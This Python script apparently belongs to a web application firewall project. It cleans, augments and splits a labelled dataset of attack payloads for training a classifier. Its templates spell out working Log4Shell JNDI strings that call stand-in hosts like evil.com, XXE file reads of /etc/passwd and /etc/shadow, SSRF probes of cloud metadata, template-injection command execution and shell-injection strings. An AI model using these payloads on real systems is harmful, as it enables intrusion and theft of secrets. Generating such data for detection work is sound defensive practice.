#!/usr/bin/env python3
"""
balance_and_split.py  -  Virex WAF Dataset Quality Pipeline
Loads combined_external.csv -> clean -> label standardize -> augment -> dedup -> shuffle -> split 70/15/15
"""
import csv, hashlib, json, random, re
from collections import Counter, defaultdict
from pathlib import Path

SEED = 42
random.seed(SEED)
SRC_CSV = Path("backend/data/external/extracted/combined_external.csv")
OUT_DIR = Path("backend/data")
OUT_DIR.mkdir(parents=True, exist_ok=True)

FINAL_LABELS = ["normal","sqli","xss","command_injection","path_traversal","xxe","ssrf","ssti","log4shell"]

LABEL_MAP = {
    "cmdi": "command_injection", "command": "command_injection", "cmd": "command_injection",
    "sql": "sqli", "sql_injection": "sqli",
    "path": "path_traversal", "traversal": "path_traversal", "lfi": "path_traversal", "rfi": "path_traversal",
}

AUG_TARGETS = {"log4shell": 5000, "xxe": 5000, "ssrf": 5000, "ssti": 5000, "command_injection": 10000}

_MD_LINK = re.compile(r'^\[[^\]]+\]\([^)]*\)$')
_MD_HEAD = re.compile(r'^#{1,6}\s+')
_ATTACK  = re.compile(
    r"[<>'\"`;|&${}\[\]()=\\/%+#@!*^~?]|\.\.|"
    r"(?i)(select|union|insert|drop|exec|system|eval|alert|script|jndi|ldap|"
    r"etc/passwd|localhost|127\.0\.0|doctype|entity|template|render|cmd|bash|"
    r"python|wget|curl|chmod|jinja|twig|freemarker|velocity|smarty|\$\{|<%|%>)"
)

def is_valid(text, label):
    t = text.strip()
    if not t or len(t) < 4: return False
    if _MD_LINK.match(t) or _MD_HEAD.match(t): return False
    if label != "normal" and not _ATTACK.search(t): return False
    if re.match(r'^[A-Za-z][a-zA-Z\s\-]{10,}$', t) and len(t.split()) > 4 and not _ATTACK.search(t): return False
    return True

_seen = set()
def md5(s): return hashlib.md5(s.encode("utf-8", errors="ignore")).hexdigest()
def is_dup(t):
    h = md5(t)
    if h in _seen: return True
    _seen.add(h); return False
def reset_dedup(): _seen.clear()

# ── Helpers ──────────────────────────────────────────────
def _rh(): return random.choice(["attacker.com","evil.com","callback.net","burpcollab.net","interact.sh","oast.me"])
def _rp(): return random.choice([80,443,1389,389,1099,53,8080,4444,9999])
def _rc(): return random.choice(["id","whoami","uname -a","cat /etc/passwd","ls -la","hostname","env","ps aux"])
def _rs(): return random.choice([";","||","&&","|","`","${IFS}","\n"])

# ── Log4Shell Augmenter ───────────────────────────────────
L4_TMPLS = [
    "${jndi:PROTO://HOST:PORT/SUFFIX}",
    "${${lower:j}ndi:PROTO://HOST:PORT/SUFFIX}",
    "${${::-j}${::-n}di:PROTO://HOST:PORT/SUFFIX}",
    "${j${::-n}di:PROTO://HOST:PORT/SUFFIX}",
    "${${upper:j}ndi:PROTO://HOST:PORT/SUFFIX}",
    "${${::-j}${::-n}${::-d}${::-i}:PROTO://HOST:PORT/SUFFIX}",
    "X-Api-Version: ${jndi:PROTO://HOST:PORT/SUFFIX}",
    "User-Agent: ${jndi:PROTO://HOST:PORT/SUFFIX}",
    "Referer: ${jndi:PROTO://HOST:PORT/SUFFIX}",
    "X-Forwarded-For: ${jndi:PROTO://HOST:PORT/SUFFIX}",
    "Accept-Language: ${jndi:PROTO://HOST:PORT/SUFFIX}",
    "${jndi:PROTO://HOST:PORT/${env:HOSTNAME}}",
    "${jndi:PROTO://HOST:PORT/${java:version}}",
    "${jndi:PROTO://HOST:PORT/${sys:user.name}}",
    "${j${lower:N}di:PROTO://HOST:PORT/SUFFIX}",
    "${jndi:PROTO://HOST:PORT/${java:os}}",
]
L4_PROTOS = ["ldap","ldaps","rmi","dns","iiop","corba"]
L4_SFXS   = ["a","payload","exploit","test","cb","x","shell","rce","pwn"]

def aug_log4shell(base, target):
    out = []
    needed = (target - len(base)) * 3
    for _ in range(needed):
        t = random.choice(L4_TMPLS)
        out.append(t.replace("PROTO", random.choice(L4_PROTOS))
                    .replace("HOST",  _rh())
                    .replace("PORT",  str(_rp()))
                    .replace("SUFFIX",random.choice(L4_SFXS)))
    return out

# ── XXE Augmenter ─────────────────────────────────────────
XXE_FILES = ["/etc/passwd","/etc/shadow","/etc/hosts","/proc/self/environ","/proc/version",
             "/etc/hostname","/windows/win.ini","c:\\boot.ini","/etc/crontab","/var/log/auth.log"]
XXE_ENTS  = ["xxe","evil","data","secret","file","external","test","read","foo","bar"]
XXE_TMPLS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY ENTITY SYSTEM "FILE">]><root>&ENTITY;</root>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY ENTITY SYSTEM "file://FILE">]><foo>&ENTITY;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY ENTITY SYSTEM "php://filter/convert.base64-encode/resource=FILE">]><foo>&ENTITY;</foo>',
    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY ENTITY SYSTEM "file:///FILE">]><test>&ENTITY;</test>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY ENTITY SYSTEM "FILE">]><foo>&ENTITY;</foo>',
    '<!DOCTYPE foo [<!ENTITY ENTITY PUBLIC "-//ATT//DTD//EN" "http://evil.com/evil.dtd">]><foo>&ENTITY;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY ENTITY SYSTEM "netdoc://FILE">]><foo>&ENTITY;</foo>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]><root/>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY ENTITY SYSTEM "expect://id">]><data>&ENTITY;</data>',
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY ENTITY "&lol;&lol;&lol;&lol;">]><lolz>&ENTITY;</lolz>',
]

def aug_xxe(base, target):
    out = []
    needed = (target - len(base)) * 3
    for _ in range(needed):
        t = random.choice(XXE_TMPLS)
        ent = random.choice(XXE_ENTS) + str(random.randint(1,999))
        f = random.choice(XXE_FILES)
        if random.random() < 0.3:
            f = f + "%00"
        out.append(t.replace("ENTITY", ent).replace("FILE", f))
    return out

# ── SSRF Augmenter ────────────────────────────────────────
SSRF_PR = ["http","https","file","gopher","dict","ftp","sftp","ldap","jar","netdoc"]
SSRF_TG = ["127.0.0.1","localhost","0.0.0.0","[::1]","169.254.169.254","metadata.google.internal",
           "192.168.1.1","10.0.0.1","0x7f000001","2130706433","::ffff:127.0.0.1","172.16.0.1",
           "169.254.170.2","fe80::1","0177.0.0.01","127.1"]
SSRF_PA = ["/","/.env","/admin","/internal","/api/v1","/health","/latest/meta-data/",
           "/computeMetadata/v1/","/etc/passwd","/proc/self/environ","/.git/config","/admin/config"]
SSRF_PM = ["url","target","redirect","next","u","dest","destination","link","goto","host",
           "proxy","callback","returnTo","image_url","open","src","fetch","load"]

def aug_ssrf(base, target):
    out = []
    needed = (target - len(base)) * 3
    for _ in range(needed):
        proto = random.choice(SSRF_PR); host = random.choice(SSRF_TG)
        port  = _rp(); path = random.choice(SSRF_PA); param = random.choice(SSRF_PM)
        style = random.randint(0, 3)
        if   style == 0: out.append(f"{param}={proto}://{host}:{port}{path}")
        elif style == 1: out.append(f"{proto}://{host}{path}")
        elif style == 2: out.append(f"GET /?{param}={proto}://{host}:{port}{path} HTTP/1.1")
        else:            out.append(f"{param}={proto}://{host}{path}")
    return out

# ── SSTI Augmenter ────────────────────────────────────────
SSTI_PLS = [
    "{{7*7}}", "{{7*'7'}}", "{{config}}", "{{self.__class__.__mro__[1].__subclasses__()}}",
    "{{request.environ}}", "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{% for c in [].__class__.__base__.__subclasses__() %}{{c}}{% endfor %}",
    "${7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    "#set($x=7*7)${x}", "#foreach($i in [1..10])${i}#end",
    "{7*7}", "{$smarty.version}", "<%=7*7%>", "@(7*7)", "@{var x=7*7;}",
    "{{constructor.constructor('return process')()}}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "#{7*7}", "*{7*7}", "<p th:utext=\"${T(java.lang.Runtime).getRuntime().exec('id')}\">",
    "{{''.__class__.__mro__[2].__subclasses__()}}", "${7*'7'}", "${.data_model}",
    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
    "${product.name?html}", "{{'a'~'b'}}", "{{constant('PHP_OS')}}", "{'cat /etc/passwd'|exec}",
    "{{request}}", "{{config.items()}}", "@Html.Raw(Model)", "@(Html.Raw('<script>alert(1)</script>'))",
    "${7}", "{{namespace.__init__.__globals__}}", "<%= System.getenv() %>",
]
SSTI_CMDS = ["id","whoami","uname -a","cat /etc/passwd","ls /","env","hostname",
             "cat /etc/shadow","cat /etc/hosts","ps aux","netstat -an","ls -la /tmp"]
SSTI_VARS = ["x","y","z","a","b","c","n","v","r","q","s","t","num","val","res","out","tmp"]
SSTI_ENGINES = [
    # Jinja2
    ("jinja2",  "{{VAR*NUM}}"),
    ("jinja2",  "{{VAR+NUM}}"),
    ("jinja2",  "{{config.items()}}"),
    ("jinja2",  "{{request.environ}}"),
    ("jinja2",  "{{cycler.__init__.__globals__.os.popen('CMD').read()}}"),
    ("jinja2",  "{{VAR.__class__.__mro__[1].__subclasses__()}}"),
    ("jinja2",  "{{namespace.__init__.__globals__}}"),
    ("jinja2",  "{{''.__class__.__mro__[2].__subclasses__()}}"),
    ("jinja2",  "{{% set VAR=NUM*NUM %}}{{VAR}}"),
    ("jinja2",  "{{constructor.constructor('return process')()"),
    # Twig
    ("twig",    "{{VAR*NUM}}"),
    ("twig",    "{{constant('PHP_OS')}}"),
    ("twig",    "{{_self.env.registerUndefinedFilterCallback('CMD')}}{{_self.env.getFilter('VAR')}}"),
    ("twig",    "{{'CHAR'~'VAR'}}"),
    ("twig",    "{{app.request.server.all|join(',')}}"),
    # FreeMarker
    ("freemarker", "${VAR*NUM}"),
    ("freemarker", "<#assign VAR='freemarker.template.utility.Execute'?new()>${VAR('CMD')}"),
    ("freemarker", "${VAR?html}"),
    ("freemarker", "${.data_model}"),
    # Velocity
    ("velocity", "#set($VAR=NUM*NUM)${VAR}"),
    ("velocity", "#foreach($VAR in [1..NUM])${VAR}#end"),
    # Smarty
    ("smarty",   "{VAR*NUM}"),
    ("smarty",   "{$smarty.version}"),
    ("smarty",   "{'CMD'|exec}"),
    # EL / Spring
    ("el",       "#{VAR*NUM}"),
    ("el",       "*{VAR*NUM}"),
    ("el",       "${T(java.lang.Runtime).getRuntime().exec('CMD')}"),
    # Mako/ERB
    ("mako",     "${VAR*NUM}"),
    ("erb",      "<%=VAR*NUM%>"),
    ("erb",      "<%= System.getenv('PATH') %>"),
    # Razor
    ("razor",    "@(VAR*NUM)"),
    ("razor",    "@{var VAR=NUM*NUM;}"),
    ("razor",    "@Html.Raw(Model)"),
    # Thymeleaf
    ("thymeleaf", "<p th:utext=\"${T(java.lang.Runtime).getRuntime().exec('CMD')}\">"),
]

def aug_ssti(base, target):
    out = []
    nums  = list(range(1, 50))
    chars = list("abcdefghijklmnopqrstuvwxyz")
    needed = (target - len(base)) * 3
    while len(out) < needed:
        _, tmpl = random.choice(SSTI_ENGINES)
        var  = random.choice(SSTI_VARS)
        num  = random.choice(nums)
        cmd  = random.choice(SSTI_CMDS)
        char = random.choice(chars)
        p = (tmpl.replace("VAR", var)
                 .replace("NUM", str(num))
                 .replace("CMD", cmd)
                 .replace("CHAR", char))
        out.append(p)
    return out


# ── Command Injection Augmenter ───────────────────────────
CMDI_T  = ["PARAM=VALUE{SEP}CMD","PARAM=VALUE%0aCMD","PARAM=VALUE|CMD","PARAM=VALUE||CMD",
           "PARAM=VALUE&&CMD","PARAM=$(CMD)","PARAM=VALUE;CMD;","| CMD","; CMD","&& CMD",
           "$(CMD)","`CMD`","PARAM=VALUE%0d%0aCMD","PARAM=VALUE%7cCMD","PARAM=1;CMD#",
           "PARAM=a&CMD","PARAM=x\nCMD"]
CMDI_PM = ["input","q","search","name","file","id","cmd","exec","ip","host","path","query",
           "data","text","val","param","keyword","term","s","query_string"]
CMDI_VL = ["test","foo","bar","admin","1","2","index","data","query","hello","world","abc","xyz","0"]

def aug_cmdi(base, target):
    out = []
    needed = (target - len(base)) * 3
    for _ in range(needed):
        t = random.choice(CMDI_T)
        out.append(t.replace("PARAM", random.choice(CMDI_PM))
                    .replace("VALUE", random.choice(CMDI_VL))
                    .replace("{SEP}", _rs())
                    .replace("CMD",   _rc()))
    return out

AUGMENTERS = {
    "log4shell": aug_log4shell, "xxe": aug_xxe, "ssrf": aug_ssrf,
    "ssti": aug_ssti, "command_injection": aug_cmdi,
}

# ── Pipeline ──────────────────────────────────────────────
def load_clean(src):
    print(f"[1] Loading {src} ...")
    rows = list(csv.DictReader(open(src, encoding="utf-8")))
    print(f"    Raw rows: {len(rows):,}")
    cleaned, noise = [], 0
    for r in rows:
        lbl = LABEL_MAP.get(r.get("label","").strip().lower(), r.get("label","").strip().lower())
        p   = r.get("payload","").strip()
        src2= r.get("source","external")
        if lbl not in FINAL_LABELS or not is_valid(p, lbl):
            noise += 1; continue
        cleaned.append({"payload": p, "label": lbl, "source": src2})
    print(f"    After cleaning: {len(cleaned):,}  (noise removed: {noise:,})")
    return cleaned

def dedup(data):
    unique, dupes = [], 0
    for r in data:
        if is_dup(r["payload"]): dupes += 1
        else: unique.append(r)
    return unique, dupes

def split_strat(data):
    by_cls = defaultdict(list)
    for r in data: by_cls[r["label"]].append(r)
    tr, va, te = [], [], []
    for lbl, items in by_cls.items():
        random.shuffle(items); n = len(items)
        nte = max(1, int(n * 0.15)); nva = max(1, int(n * 0.15)); ntr = n - nte - nva
        tr.extend(items[:ntr]); va.extend(items[ntr:ntr+nva]); te.extend(items[ntr+nva:])
    return tr, va, te

def wcsv(data, path):
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=["payload","label","source"])
        w.writeheader(); w.writerows(data)
    print(f"    Saved {path}  ({len(data):,} rows)")

def build_report(before, after, aug_counts, dupes, tr, va, te):
    all_d = tr + va + te
    th = {md5(r["payload"]) for r in tr}
    vh = {md5(r["payload"]) for r in va}
    eh = {md5(r["payload"]) for r in te}
    tv, tt, vt = len(th&vh), len(th&eh), len(vh&eh)

    def dtbl(d):
        tot = sum(d.values()); rows = ""
        for lbl in FINAL_LABELS:
            n = d.get(lbl,0); rows += f"| `{lbl}` | {n:,} | {n/tot*100:.1f}% |\n"
        rows += f"| **TOTAL** | **{tot:,}** | 100% |\n"; return rows

    def stbl(data):
        c = Counter(r["label"] for r in data); rows = ""
        for lbl in FINAL_LABELS:
            n = c.get(lbl,0); rows += f"| `{lbl}` | {n:,} | {n/len(data)*100:.1f}% |\n"
        return rows

    def samps(lbl, n=10):
        items = [r["payload"] for r in all_d if r["label"] == lbl]
        sample = random.sample(items, min(n, len(items)))
        lines = ""
        for i, p in enumerate(sample, 1):
            p = p.replace("`","'").replace("\n"," ")[:120]
            lines += f"  {i}. `{p}`\n"
        return lines

    aug_tbl = ""
    for lbl in FINAL_LABELS:
        rn = before.get(lbl,0); an = aug_counts.get(lbl,0); tn = after.get(lbl,0)
        ratio = f"{an/rn:.1f}x" if rn > 0 and an > 0 else "-"
        aug_tbl += f"| `{lbl}` | {rn:,} | {an:,} | {tn:,} | {ratio} |\n"

    tl = {r["label"] for r in tr}; vl = {r["label"] for r in va}; el = {r["label"] for r in te}
    cov = ""
    for lbl in FINAL_LABELS:
        cov += f"| `{lbl}` | {'YES' if lbl in tl else 'NO'} | {'YES' if lbl in vl else 'NO'} | {'YES' if lbl in el else 'NO'} |\n"

    samps_sec = ""
    for lbl in FINAL_LABELS: samps_sec += f"### `{lbl}`\n\n" + samps(lbl) + "\n"

    leak = "**PASS** - Zero payload overlap." if tv==0 and tt==0 and vt==0 else "**FAIL** - Overlap detected!"

    rpt = f"""# WAF Dataset Balance & Split Verification Report

---

## 1. Class Distribution — Before Balancing

| Label | Count | % |
|-------|-------|---|
{dtbl(before)}

---

## 2. Class Distribution — After Balancing

| Label | Count | % |
|-------|-------|---|
{dtbl(after)}

---

## 3. Augmented Samples Per Class

| Class | Real | Augmented | Total | Augmentation Ratio |
|-------|------|-----------|-------|-------------------|
{aug_tbl}
> Augmentation applied ONLY to: `command_injection`, `xxe`, `ssrf`, `ssti`, `log4shell`
> `normal` traffic: **NO synthetic data generated**

---

## 4. Duplicates Removed

- **Total duplicates removed**: {dupes:,}

---

## 5. Final Label Names

| # | Label |
|---|-------|
| 1 | `normal` |
| 2 | `sqli` |
| 3 | `xss` |
| 4 | `command_injection` *(renamed from `cmdi`)* |
| 5 | `path_traversal` |
| 6 | `xxe` |
| 7 | `ssrf` |
| 8 | `ssti` |
| 9 | `log4shell` |

> Previous label `cmdi` renamed to `command_injection`. All other labels were already standard.

---

## 6. Train / Validation / Test Split

| Split | File | Rows | % |
|-------|------|------|---|
| Train | `backend/data/train.csv` | {len(tr):,} | {len(tr)/len(all_d)*100:.1f}% |
| Validation | `backend/data/validation.csv` | {len(va):,} | {len(va)/len(all_d)*100:.1f}% |
| Test | `backend/data/test.csv` | {len(te):,} | {len(te)/len(all_d)*100:.1f}% |
| **Total** | | **{len(all_d):,}** | **100%** |

### Train split

| Label | Count | % |
|-------|-------|---|
{stbl(tr)}

### Validation split

| Label | Count | % |
|-------|-------|---|
{stbl(va)}

### Test split

| Label | Count | % |
|-------|-------|---|
{stbl(te)}

---

## 7. Class Coverage in Every Split

| Label | In Train | In Validation | In Test |
|-------|----------|---------------|---------|
{cov}

---

## 8. Data Leakage Check

| Overlap | Count | Status |
|---------|-------|--------|
| Train ∩ Validation | {tv} | {'PASS' if tv==0 else 'FAIL'} |
| Train ∩ Test | {tt} | {'PASS' if tt==0 else 'FAIL'} |
| Validation ∩ Test | {vt} | {'PASS' if vt==0 else 'FAIL'} |

> {leak}

---

## 9. Random Samples Per Class (10 each)

{samps_sec}
"""
    (OUT_DIR / "balance_report.md").write_text(rpt, encoding="utf-8")
    print(f"    Report: {OUT_DIR / 'balance_report.md'}")
    (OUT_DIR / "balance_report.json").write_text(json.dumps({
        "before": before, "after": after, "augmented": aug_counts,
        "duplicates_removed": dupes,
        "train_size": len(tr), "val_size": len(va), "test_size": len(te),
        "leakage": {"train_val": tv, "train_test": tt, "val_test": vt},
    }, indent=2), encoding="utf-8")


def main():
    random.seed(SEED)
    print("="*62)
    print("  Virex WAF | Dataset Balance & Split Pipeline")
    print("="*62)

    data = load_clean(SRC_CSV)
    before = {lbl: sum(1 for r in data if r["label"]==lbl) for lbl in FINAL_LABELS}
    print("\n[2] Distribution BEFORE balancing:")
    for lbl, n in sorted(before.items(), key=lambda x: -x[1]):
        print(f"    {lbl:<22} {n:>8,}")

    reset_dedup()
    print("\n[3] Deduplicating real data ...")
    data, d1 = dedup(data)
    print(f"    Removed {d1:,} dupes. Remaining: {len(data):,}")

    by_lbl = defaultdict(list)
    for r in data: by_lbl[r["label"]].append(r)

    print("\n[4] Augmenting minority classes ...")
    aug_counts = {}
    for lbl in FINAL_LABELS:
        tgt = AUG_TARGETS.get(lbl, 0); aug_counts[lbl] = 0
        if not tgt: continue
        base = [r["payload"] for r in by_lbl[lbl]]; curr = len(base)
        if curr >= tgt:
            print(f"    {lbl}: {curr:,} >= {tgt:,} (no aug needed)"); continue
        new_pls = AUGMENTERS[lbl](base, tgt)
        added = 0
        for p in new_pls:
            p = p.strip()
            if not p or is_dup(p): continue
            by_lbl[lbl].append({"payload": p, "label": lbl, "source": "augmented"})
            added += 1
            if len(by_lbl[lbl]) >= tgt: break
        aug_counts[lbl] = added
        print(f"    {lbl:<22} {curr:>6,} -> {len(by_lbl[lbl]):>6,}  (+{added:,})")

    all_data = [r for items in by_lbl.values() for r in items]
    after = {lbl: sum(1 for r in all_data if r["label"]==lbl) for lbl in FINAL_LABELS}
    print("\n[5] Distribution AFTER balancing:")
    for lbl in FINAL_LABELS: print(f"    {lbl:<22} {after.get(lbl,0):>8,}")

    reset_dedup()
    print("\n[6] Final deduplication ...")
    all_data, d2 = dedup(all_data)
    print(f"    Removed {d2:,} aug dupes. Total deduped: {d1+d2:,}")

    random.seed(SEED); random.shuffle(all_data)
    print(f"\n[7] Shuffled. Total samples: {len(all_data):,}")

    print("\n[8] Stratified split 70/15/15 ...")
    tr, va, te = split_strat(all_data)
    random.shuffle(tr); random.shuffle(va); random.shuffle(te)
    print(f"    Train: {len(tr):,}  |  Val: {len(va):,}  |  Test: {len(te):,}")
    wcsv(tr, OUT_DIR / "train.csv")
    wcsv(va, OUT_DIR / "validation.csv")
    wcsv(te, OUT_DIR / "test.csv")

    print("\n[9] Writing report ...")
    after_final = {lbl: sum(1 for r in all_data if r["label"]==lbl) for lbl in FINAL_LABELS}
    build_report(before, after_final, aug_counts, d1+d2, tr, va, te)

    print("\n" + "="*62)
    print("  COMPLETE")
    print(f"  Train      : {len(tr):,} rows -> backend/data/train.csv")
    print(f"  Validation : {len(va):,} rows -> backend/data/validation.csv")
    print(f"  Test       : {len(te):,} rows -> backend/data/test.csv")
    print(f"  Report     : backend/data/balance_report.md")
    print("="*62)

if __name__ == "__main__":
    main()
